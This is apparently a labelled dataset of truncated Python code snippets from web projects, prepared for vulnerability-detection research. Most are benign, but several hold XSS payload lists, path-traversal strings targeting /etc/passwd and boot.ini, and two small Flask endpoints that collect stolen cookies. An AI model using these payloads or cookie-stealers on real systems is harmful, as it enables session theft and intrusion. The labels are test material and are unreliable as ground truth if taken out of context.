text/html\\n') \t\tprint('<center><div class=\"alert alert-danger\">Check the config file, whether it exists and", "label": 0}, {"snippet_id": 10073, "code": "=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement", "label": 0}, {"snippet_id": 16166, "code": ".login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account',", "label": 0}, {"snippet_id": 38391, "code": ") \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost", "label": 0}, {"snippet_id": 34833, "code": "\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn frappe.local.valid_columns[self.doctype] \tdef is_new(self): \t\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields", "label": 0}, {"snippet_id": 30254, "code": ": form.getvalue('b') \t} \theaders={ \t\t'User-Agent': 'Mozilla/5.0(Windows NT 5.1; rv:20.0) Gecko/20100101 Firefox/20.0', \t\t'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', \t\t'Accept", "label": 0}, {"snippet_id": 12444, "code": "<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 33277, "code": " have builds for a long time.\"\"\" @decorators.require_cronjob def get(self): service.unregister_builders() def get_frontend_routes(): endpoints_services=[ legacy_api.BuildBucketApi, config_api.ConfigApi", "label": 0}, {"snippet_id": 36098, "code": "\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param parentfield: If fieldname is in child table.\"\"\" \t\tfrom", "label": 0}, {"snippet_id": 26828, "code": "%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini' ] lfi_expect=['[operating systems]', '[boot loader]', '/fastdetect', ", "label": 0}, {"snippet_id": 32122, "code": " api.keystone.mapping_delete(request, obj_id) class MappingFilterAction(tables.FilterAction): def filter(self, table, mappings, filter_string): \"\"\"Naive case-insensitive search.\"\"\" q=filter_string.lower", "label": 0}, {"snippet_id": 27472, "code": " _MENU_ITEMS=[] add_jinja2_filter('json', encode_json) add_jinja2_filter('format_time', format_time) add_jinja2_filter('splitlines', splitlines) add_jinja2_filter('split_br', split_br) add_jinja2_filter", "label": 0}, {"snippet_id": 30428, "code": "\tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \t \tif grep is not None: \tgrep_act ='|grep' \telse: \t\tgrep_act='' \t\tgrep='' \tsyslog_server_enable=sql.get_setting('syslog_server_enable') \tif syslog_server_enable", "label": 0}, {"snippet_id": 53854, "code": "/') def index(): \treturn 'steal cookie:) ' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie", "label": 1}, {"snippet_id": 46149, "code": ": is_mobile, }) def index_m(request): return index(request, True) def new_search(request): engine=request.GET.get('engine', 'solr') collections=get_engine(request.user, engine).datasets() if not collections", "label": 0}, {"snippet_id": 4986, "code": ">', '<s=\" onclick=confirm``>clickme', '<svG oNLoad=co\\u006efirm& '\\'\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co", "label": 0}, {"snippet_id": 3455, "code": "(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url", "label": 0}, {"snippet_id": 53341, "code": "() def edit_bundle(request): bundle_id=request.GET.get('bundle') doc=None if bundle_id: doc=Document2.objects.get(id=bundle_id) bundle=Bundle(document=doc) else: bundle=Bundle() coordinators=[dict([('uuid", "label": 0}, {"snippet_id": 31243, "code": ".plotting import figure, output_file, show \tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker \tfrom bokeh.layouts import widgetbox, gridplot \tfrom bokeh.models.widgets", "label": 0}, {"snippet_id": 16893, "code": ", name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id", "label": 0}, {"snippet_id": 43314, "code": "\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self):", "label": 0}, {"snippet_id": 12675, "code": "+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history", "label": 0}, {"snippet_id": 22125, "code": ".contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE')", "label": 0}, {"snippet_id": 4036, "code": "(parsed_url+'/'+payload,\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers", "label": 0}, {"snippet_id": 52330, "code": "\"application/json\") @check_document_modify_permission() def save_workflow(request): response={'status': -1} workflow=json.loads(request.POST.get('workflow', '{}')) layout=json.loads(request.POST.get('layout', '", "label": 0}, {"snippet_id": 43994, "code": " is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: \t\t\t\t\tfval=(\"", "label": 0}, {"snippet_id": 21453, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware", "label": 0}, {"snippet_id": 32442, "code": "/gitiles/+/master/Documentation/markdown.md Args: value: The name of a section that is to be converted. _separator: Unused. This is actually a configurable string that is used as a replacement character for", "label": 0}, {"snippet_id": 47611, "code": "(NumberField(name='dect', minimum=0)) f.add_content(PlainText('Number of allowed reservations: ')) f.add_content(NumberField(name='allowed_reservations', button_text=str(1), minimum=0)) f.add_content(PlainText", "label": 0}, {"snippet_id": 33720, "code": ":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children", "label": 0}, {"snippet_id": 50839, "code": " cmd=\"prompt\" if prompt else \"text\" if raw: args[0]=text else: args[0]=parse_html(text, strip_ansi=nocolor) self.client.lineSend(self.csessid,[cmd, args, kwargs]) def send_prompt(self, *args, **kwargs)", "label": 0}, {"snippet_id": 43989, "code": ",(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval", "label": 0}, {"snippet_id": 18570, "code": "]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)", "label": 0}, {"snippet_id": 28329, "code": "\t \treturn sys.path[0] if d==\"app\" else os.path.dirname(sys.path[0])\t def get_config_var(sec, var): \tfrom configparser import ConfigParser, ExtendedInterpolation \ttry: \t\tpath_config=get_app_dir()+\"/haproxy", "label": 0}, {"snippet_id": 19180, "code": "/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib", "label": 0}, {"snippet_id": 51384, "code": " dashboard project. Generated by 'django-admin startproject' using Django 2.1.7. For more information on this file, see https://docs.djangoproject.com/en/2.1/topics/settings/ For the full list of settings", "label": 0}, {"snippet_id": 38816, "code": "=None): \t\tif value==None: \t\t\tvalue={} \t\tif isinstance(value,(dict, BaseDocument)): \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key", "label": 0}, {"snippet_id": 52452, "code": "=json.loads(request.POST.get('node', '{}')) properties=NODES[node['widgetType']].get_mandatory_fields() workflows=[] if node['widgetType']=='subworkflow-widget': workflows=_get_workflows(request.user) response", "label": 0}, {"snippet_id": 32946, "code": ".rstrip('/'), d, d)) break self.wfile.write('</div>') self._WriteTemplate('footer.html') def _DoImage(self, full_path, mime_type): self._WriteHeader(mime_type) with open(full_path) as f: self.wfile.write(f", "label": 1}, {"snippet_id": 28524, "code": "\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/keep_alive-\"+get_data('logs')+\".log\", \"a\") \telse: \t\tmess=get_data('date_in_log') +\" from \" +IP +\" user: \" +login +\" \" +action +\" for: ", "label": 0}, {"snippet_id": 13608, "code": "', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views", "label": 0}, {"snippet_id": 47023, "code": ", comment_id): comment=await Comment.cache(comment_id) if comment: asyncio.gather( clear_mc(MC_KEY_COMMENT_LIST % comment.post_id), clear_mc(MC_KEY_COMMNET_IDS_LIKED_BY_USER %( user_id, comment.post_id", "label": 0}, {"snippet_id": 48780, "code": ".formats import localize from django.utils.html import format_html, escape from django.utils.http import urlencode from django.utils.translation import gettext_lazy as _ from typing import List from smart_lists", "label": 0}, {"snippet_id": 47527, "code": ".add_content(TextField(name='display_name', button_text=profile.displayName)) f.add_content(PlainText('DECT: ')) f.add_content(NumberField(name='dect', button_text=str(profile.dect), minimum=0)) f.add_content", "label": 0}, {"snippet_id": 12190, "code": "[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/", "label": 1}, {"snippet_id": 1666, "code": " if data['id']==\"NA\": all_data={'url': data['url'], 'impact': data['impact'], 'name': data['name'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], ", "label": 0}, {"snippet_id": 13015, "code": ".conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=", "label": 0}, {"snippet_id": 53299, "code": " properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting coordinator %s\") %(coordinator,), detail=ex._headers.get('oozie-error-message',", "label": 0}, {"snippet_id": 38177, "code": " Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1", "label": 0}, {"snippet_id": 49392, "code": " is_active(self): if self.field_name in self.query_params: selected_value=self.query_params[self.field_name] if type(selected_value)==list: selected_value=selected_value[0] if selected_value==self.value: return", "label": 0}, {"snippet_id": 28312, "code": "\t\t\t\t\t\t\tselect_id=\"serv\", \t\t\t\t\t\t\tserv=serv, \t\t\t\t\t\t\taftersave=aftersave, \t\t\t\t\t\t\tconfig=config_read, \t\t\t\t\t\t\tcfg=cfg, \t\t\t\t\t\t\tselects=servers, \t\t\t\t\t\t\tstderr=stderr, \t\t\t\t\t\t\terror=error, \t\t\t\t\t\t\tnote=1, \t\t\t\t\t\t", "label": 0}, {"snippet_id": 12069, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about", "label": 0}, {"snippet_id": 45529, "code": " extra='bundle2')] return render('editor/list_editor_bundles.mako', request,{ 'bundles': bundles }) @check_document_access_permission() def edit_bundle(request): bundle_id=request.GET.get('bundle') doc", "label": 0}, {"snippet_id": 27438, "code": "<br */>\\s*', text, flags=re.IGNORECASE) def encode_json(value): \"\"\"Dump base64-encoded JSON string(to avoid XSS).\"\"\" return base64.b64encode(json.dumps(value, cls=JsonEncoder)) _JINJA_ENVIRONMENT=jinja2", "label": 0}, {"snippet_id": 49060, "code": ".column_id=column_id self.ordering_query_param=ordering_query_param self.query_order=query_params.get(ordering_query_param) self.current_columns=[int(col) for col in self.query_order.replace(\"-\", \"\").split(", "label": 0}, {"snippet_id": 29418, "code": "\">Can\\'t read export config file</div>') \t \tfirewalld_commands=[] \t \tfor line in conf: \t\tif \"bind\" in line: \t\t\tbind=line.split(\":\") \t\t\tbind[1]=bind[1].strip(' ') \t\t\tbind=bind[1].split(\"ssl\") \t\t\tbind=bind", "label": 0}, {"snippet_id": 7776, "code": "'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 19801, "code": " test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is", "label": 0}, {"snippet_id": 35164, "code": " modified timestamp''' \t\tself.set(\"modified\", now()) \t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get", "label": 0}, {"snippet_id": 48094, "code": " chunk in file.chunks(): destination.write(chunk) original=Image.open(high_res_file_name) width, height=original.size diameter=math.sqrt(math.pow(width, 2) +math.pow(height, 2)) width /=diameter height", "label": 0}, {"snippet_id": 51846, "code": "%(funcName)20s() -%(message)s', }, 'color':{ '()': 'colorlog.ColoredFormatter', 'format': '%(log_color)s%(asctime)s\\t%(levelname)-8s -' '%(message)s', 'datefmt': '%Y-%m-%d %H:%M', 'log_colors':{ 'DEBUG", "label": 0}, {"snippet_id": 47276, "code": " client: res=client.get(index_view_url) assert res.status_code==200 with patch('invenio_records.models.RecordMetadata') as db_mock: db_mock.side_effect=SQLAlchemyError() res=client.post( delete_view_url,", "label": 0}, {"snippet_id": 43613, "code": "][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname) \t\t\tif df.fieldtype in(\"Currency\", \"Float\", \"Percent", "label": 0}, {"snippet_id": 26851, "code": "', ':/root:/bin'] def check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url): global xss_attacks global DEBUG if page.find(\"http://\")==0 or page.find(\"https://", "label": 0}, {"snippet_id": 29286, "code": "=\"\" \t \ttry: \t\tos.system(\"dos2unix \"+cfg) \texcept OSError: \t\treturn 'Please install dos2unix' \t\tpass \t \tif kwargs.get(\"keepalived\")==1: \t\tif kwargs.get(\"just_save\")==\"save\": \t\t\tcommands=[ \"sudo mv -f \" ", "label": 0}, {"snippet_id": 33856, "code": "(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"", "label": 0}, {"snippet_id": 20276, "code": " noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the", "label": 0}, {"snippet_id": 11461, "code": "{dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains='localhost', report_dir=self.pa11y_report_dir, reporter=\"1.0-json\",", "label": 0}, {"snippet_id": 24923, "code": "(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler", "label": 0}, {"snippet_id": 45720, "code": " extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_bundle", "label": 0}, {"snippet_id": 10978, "code": "-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"-", "label": 0}, {"snippet_id": 48625, "code": " in request.GET: r=GroupReservation.objects.get(id=int(request.GET[\"rid\"])) elif u.number_of_allowed_reservations > GroupReservation.objects.all().filter(createdByUser=u).count(): r=GroupReservation() r", "label": 0}, {"snippet_id": 11284, "code": ".should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self", "label": 0}, {"snippet_id": 8060, "code": "/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade", "label": 0}, {"snippet_id": 54064, "code": ".get(),bypass=True) pr=proxy.get() if len(pr)==0: pr=None if method.get()==\"GET\": get=True post=False elif method.get()==\"POST\": get=False post=True else: get=True post=True fresh=False if refresh.get()==", "label": 0}, {"snippet_id": 41815, "code": "=None): \t\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance(filters, dict): \t\t\t\t\tvalue=_filter(self.__dict__.get(key,[]", "label": 0}, {"snippet_id": 32657, "code": ":{ 'slugify': _gitiles_slugify }, } contents=self._Read(path[1:]) md=markdown.Markdown(extensions=extensions, extension_configs=extension_configs, tab_length=2, output_format='html4') has_a_single_h1=(len", "label": 0}, {"snippet_id": 27616, "code": " make_logout_url(dest_url=self.request.url), 'contact_string': contact_string, } self.render('error-403.html', template_values, 403) def _add_security_response_headers(self): \"\"\"Add security-related headers", "label": 0}, {"snippet_id": 13292, "code": ".static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id'", "label": 0}, {"snippet_id": 3408, "code": "(parsed_url+'/'+payload,\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers", "label": 0}, {"snippet_id": 45018, "code": "]) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_workflow", "label": 0}, {"snippet_id": 6203, "code": " about 2x number of cores to 4x number of cores(if hyperthreading is available). \"\"\" return self.config.getint(self.section, 'num_threads') @property def logdir(self): \"\"\" Path to CherryPy logfiles(string", "label": 0}, {"snippet_id": 43433, "code": ") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1 and not df.get(\"allow_on_submit\"))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html(value, linkify=df.fieldtype=='Text Editor') \t", "label": 1}, {"snippet_id": 6050, "code": "'fticks_format_string': 'F-TICKS/SWAMID/2.0 'static_dir': None, 'ssl_adapter': 'builtin', 'server_cert': None, 'server_key': None, 'cert_chain': None, 'userdb_mongo_uri': None, 'userdb_mongo_database': None, ", "label": 0}, {"snippet_id": 11963, "code": "/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED", "label": 0}, {"snippet_id": 6000, "code": " version=version, description=\"eduID SAML frontend IdP\", long_description=README, classifiers=[ ], keywords='eduID SAML', author='Fredrik Thulin', author_email='fredrik@thulin.net', license='BSD', packages=[", "label": 0}, {"snippet_id": 14657, "code": ".shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name))", "label": 0}, {"snippet_id": 39174, "code": " \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn frappe.local.valid_columns[self.doctype] \tdef is_new(self): \t\treturn self.get(\"__islocal\") \tdef as_dict", "label": 0}, {"snippet_id": 26469, "code": "'../../../../../../etc/passwd', '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd', '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f", "label": 0}, {"snippet_id": 48086, "code": " open(high_res_file_name, 'wb+') as destination: for chunk in file.chunks(): destination.write(chunk) original=Image.open(high_res_file_name) width, height=original.size diameter=math.sqrt(math.pow(width,", "label": 0}, {"snippet_id": 50758, "code": " Use Screenreader mode. -send_prompt(bool): Send a prompt with parsed html \"\"\" if args: args=list(args) text=args[0] if text is None: return else: return flags=self.protocol_flags text=utils.to_str(text", "label": 0}, {"snippet_id": 17091, "code": "\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 0}, {"snippet_id": 39891, "code": ": \t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname))) \t\treturn invalid_links, cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self", "label": 0}, {"snippet_id": 3686, "code": ".split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact", "label": 0}, {"snippet_id": 22733, "code": "'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 0}, {"snippet_id": 29036, "code": " \t \tproxy_serv=proxy if proxy is not None else \"\" \t\t \tcommands=[ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+\"/\"+script +\" PROXY=\" +proxy_serv+ \t\t\t\t\" SOCK_PORT=\"+haproxy_sock_port+\"", "label": 0}, {"snippet_id": 42491, "code": ".doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: \t\t\t\t\traise \t\t\telse: \t\t\t\traise \t\tself.set(\"__islocal\", False) \tdef db_update(self)", "label": 0}, {"snippet_id": 50956, "code": " PeriodicTaskForm from django_celery_beat.models import CrontabSchedule, PeriodicTask from import_export import resources from import_export.admin import ImportExportModelAdmin from dashboard.internet_nl_dashboard", "label": 0}, {"snippet_id": 26229, "code": ") if not data.get('is_business') and not data.get('name_parts'): raise ValidationError(_('You need to provide your name.')) if 'vat_id' in self.changed_data or not data.get('vat_id'): self.instance.vat_id_validated", "label": 0}, {"snippet_id": 48294, "code": "=Missing%20reservation%20id%20in%20request\") u: Profile=get_current_user(request) current_reservation=GroupReservation.objects.get(id=str(request.GET[\"rid\"])) if current_reservation.createdByUser !=u and", "label": 0}, {"snippet_id": 14945, "code": "\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir", "label": 0}, {"snippet_id": 29472, "code": "% sql.get_setting('haproxy_config_path')] \tssh=ssh_connect(serv) \tfor command in commands: \t\tstdin, stdout, stderr=ssh.exec_command(command, get_pty=True) \t\tif not stderr.read(): \t\t\treturn True \t\telse:", "label": 0}, {"snippet_id": 4823, "code": "] _payloads=[ '<q/oncut=open()>', '<svg/onload=eval(name)>', '<img src=x onerror=alert(/xss/)>', \"\"\"<img src=\"javascript:alert('xss');\">\"\"\", \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"", "label": 0}, {"snippet_id": 31862, "code": ".getvalue('color') \t \tfor server in servers: \t\tfunct.ssh_command(server[2],[\"sudo mkdir \"+path]) \t\terror=funct.upload(server[2], path+\"/\"+form.getvalue('bwlists_save'), list, dir='fullpath') \t\tif error:", "label": 0}, {"snippet_id": 1378, "code": "['Description'], 'remediation': data['remediation']} vul_list.append(all_data) if data['id']: for vul in alerts: if data['id']==vul['id']: all_data={ 'url': data['url'], 'impact': data['impact'], 'name", "label": 0}, {"snippet_id": 50926, "code": ".auth.admin import GroupAdmin as BaseGroupAdmin from django.contrib.auth.admin import UserAdmin as BaseUserAdmin from django.contrib.auth.models import Group, User from django.contrib.humanize.templatetags", "label": 0}, {"snippet_id": 52219, "code": "') if len(jobs) > 1 else _('Workflow deleted.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def copy_workflow(request): if request.method", "label": 0}, {"snippet_id": 5582, "code": "=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\", \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"", "label": 0}, {"snippet_id": 26154, "code": ".name_parts if self.instance else self.instance.name_parts), ) if event.settings.invoice_address_required and not event.settings.invoice_address_company_required and not self.all_optional: self.fields[", "label": 0}, {"snippet_id": 11219, "code": "\"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string", "label": 0}, {"snippet_id": 2401, "code": " sendrequest as req import utils.logs as logs import urlparse import time import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update", "label": 0}, {"snippet_id": 45413, "code": " job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=coordinator.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'", "label": 0}, {"snippet_id": 34886, "code": " is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers", "label": 0}, {"snippet_id": 39228, "code": " children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", ", "label": 0}, {"snippet_id": 18080, "code": "+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render", "label": 0}, {"snippet_id": 50207, "code": "=self.databuffer.get(csessid,[]) dataentries.append(jsonify(data)) self.databuffer[csessid]=dataentries def client_disconnect(self, csessid): \"\"\" Disconnect session with given csessid. Args: csessid(int):", "label": 0}, {"snippet_id": 53919, "code": "\treturn 'Hello ^_^' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt'", "label": 0}, {"snippet_id": 14733, "code": " test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command", "label": 0}, {"snippet_id": 35513, "code": "\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name: \t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname))) \t\t\t\t\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable", "label": 0}, {"snippet_id": 35767, "code": "(default_column_max_length) \t\t\t\tif len(cstr(value)) > max_length: 